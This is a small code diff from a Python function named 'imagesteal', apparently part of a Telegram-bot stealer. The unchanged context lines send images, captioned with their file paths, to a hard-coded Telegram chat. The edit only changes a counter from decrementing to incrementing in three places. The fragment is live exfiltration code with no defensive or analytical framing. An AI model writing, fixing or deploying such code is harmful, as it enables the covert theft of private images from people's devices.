@@ -110,7 +110,7 @@ def imagesteal(message):
 				if img is not None:
 					type(img)
 					bot.send_photo(-1001452022332,img,caption=path)
-					a-=1
+					a+=1
 				   
 		except Exception as e:
 			print("ERROR : {0} \n".format(e))
@@ -125,10 +125,10 @@ def imagesteal(message):
 					if mg is not None:
 						type(mg)
 						bot.send_photo(-1001452022332,mg,caption=path)
-						a-=1
+						a+=1
 			except Exception as ee:
 				print("Error :{0}".format(ee))
-				a-=1
+				a+=1
 		
 	a+=1			   
 			
